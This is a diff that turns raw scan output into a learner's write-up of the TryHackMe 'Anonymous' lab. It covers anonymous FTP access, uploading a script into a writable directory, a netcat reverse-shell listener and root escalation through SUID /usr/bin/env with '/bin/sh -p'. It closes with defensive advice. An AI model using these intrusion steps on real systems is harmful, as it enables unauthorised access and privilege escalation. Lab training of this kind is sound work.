@@ -1,16 +1,184 @@
-*nmap scan results*
-gowtham@gowtham-Latitude-5400:~$ nmap 10.49.148.248
-Starting Nmap 7.98 ( https://nmap.org ) at 2026-11-19 03:00 +0530
-Nmap scan report for 10.49.148.248
-Host is up (0.060s latency).
+# TryHackMe — Anonymous
+
+**Date:** 19 November 2026  
+**Focus:** FTP anonymous access, file upload, reverse-shell access, Linux SUID enumeration and privilege escalation.
+
+> Practice was performed against the assigned TryHackMe machine. Replace the target address below with the current room IP when repeating the exercise. Flag values and other sensitive target details are intentionally not stored in this public learning journal.
+
+## 1. Nmap reconnaissance
+
+Command used:
+
+```bash
+nmap <TARGET_IP>
+```
+
+Observed scan output:
+
+```text
+Starting Nmap 7.98
+Host is up.
 Not shown: 996 closed tcp ports (conn-refused)
 PORT    STATE SERVICE
 21/tcp  open  ftp
 22/tcp  open  ssh
 139/tcp open  netbios-ssn
 445/tcp open  microsoft-ds
+```
 
-Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds
+**What this tells me**
 
+- **21/tcp — FTP:** worth checking for anonymous login and accessible files.
+- **22/tcp — SSH:** remote login service; no credentials were established during this step.
+- **139/tcp and 445/tcp — SMB/NetBIOS:** indicate Windows file-sharing related services, which may be worth enumerating.
 
+The scan used Nmap's default scan of the most common 1,000 TCP ports. It does not prove that no other ports are open. A broader scan can be done with `nmap -p-` when appropriate.
 
+## 2. FTP anonymous access
+
+Connected to the FTP service:
+
+```text
+ftp <TARGET_IP>
+Name: anonymous
+230 Login successful.
+```
+
+Listed the available directory and entered `scripts`:
+
+```text
+ftp> ls
+drwxrwxrwx  scripts
+
+ftp> cd scripts
+ftp> ls
+-rwxr-xrwx  clean.sh
+-rw-rw-r--  removed_files.log
+-rw-r--r--  to_do.txt
+```
+
+This showed that anonymous FTP access was enabled and that the `scripts` directory contained a shell script and two text files.
+
+## 3. Uploading the script
+
+On my local Linux machine, I checked the script type:
+
+```bash
+file clean.sh
+```
+
+Output:
+
+```text
+clean.sh: Bourne-Again shell script, ASCII text executable
+```
+
+I uploaded the local file to the FTP `scripts` directory:
+
+```text
+ftp> put clean.sh
+226 Transfer complete.
+```
+
+The upload succeeded. The transcript confirms the transfer, but does not include the script contents or prove exactly how the target later executed it. When repeating this lab, inspect the script and the room's intended execution mechanism rather than assuming that an FTP upload automatically runs a file.
+
+## 4. Receiving the reverse shell
+
+I started a Netcat listener on my machine:
+
+```bash
+nc -lvnp 4444
+```
+
+A connection arrived from the target, and I received a shell as the `namelessone` user.
+
+The shell printed:
+
+```text
+bash: cannot set terminal process group: Inappropriate ioctl for device
+bash: no job control in this shell
+```
+
+These messages are typical of a basic, non-interactive reverse shell. They mean the shell does not have a normal terminal (TTY) attached; they do not mean the connection failed.
+
+I checked the home directory:
+
+```bash
+whoami
+pwd
+ls -la
+```
+
+The account was `namelessone`, and the home directory contained `pics` and `user.txt`. I initially mistyped the filename as `user.tst`; the correct filename was `user.txt`.
+
+I read the user proof file during the room. Its value is intentionally omitted from this public note.
+
+## 5. Linux SUID enumeration
+
+I searched for SUID executables:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+The output included common SUID programs and, importantly:
+
+```text
+/usr/bin/env
+```
+
+**Why this mattered**
+
+SUID executables run with the effective user ID of the file owner. If a root-owned program has the SUID bit set and can be made to launch another program while retaining its effective privileges, it may create a privilege-escalation path.
+
+The presence of `/usr/bin/env` in the list was the key finding in this room. SUID status alone is not proof of exploitability: check the file owner, permissions, binary version and the exact behavior on the target.
+
+## 6. Privilege escalation
+
+I tested the SUID `env` binary with:
+
+```bash
+/usr/bin/env /bin/sh -p
+```
+
+Then checked the effective identity:
+
+```bash
+whoami
+```
+
+The result was:
+
+```text
+root
+```
+
+The `-p` option asks the shell to preserve its effective privileges instead of dropping them. Because the SUID `env` executable was running with root privileges, the spawned shell retained root's effective identity on this machine.
+
+I verified access to the root home directory and read the room's root proof file. The proof value is intentionally omitted from this public note.
+
+## 7. What I learned
+
+- Anonymous FTP can expose files and writable directories without a named account.
+- Uploading a file is not the same as executing it; I need to identify what process or scheduled task runs it.
+- Netcat can receive a reverse-shell connection, but a basic shell may not provide job control or a proper TTY.
+- `find / -perm -4000 -type f 2>/dev/null` is a useful first pass for SUID enumeration.
+- SUID binaries deserve closer inspection, especially when they can launch other programs.
+- `/usr/bin/env` with SUID permissions provided the privilege-escalation route in this lab.
+- I should distinguish the real user identity from effective privileges when checking privilege escalation.
+
+## 8. Defensive perspective
+
+- Disable anonymous FTP unless it is explicitly required.
+- Do not allow anonymous users to upload files into directories used by scheduled jobs or privileged scripts.
+- Ensure scripts and their parent directories cannot be modified by untrusted users.
+- Audit SUID binaries and remove the SUID bit from programs that do not need it.
+- Monitor unexpected child processes spawned by privileged utilities and review changes to executable files in script directories.
+
+## 9. Follow-up practice
+
+- [ ] Inspect the contents and permissions of `clean.sh` and explain how it was triggered.
+- [ ] Learn how to identify cron jobs and other scheduled execution mechanisms.
+- [ ] Practice checking file owner, mode and effective UID with `ls -l`, `stat` and `id`.
+- [ ] Learn to upgrade a basic reverse shell to a stable interactive TTY in an authorized lab.
+- [ ] Compare SUID, SGID and Linux file capabilities.
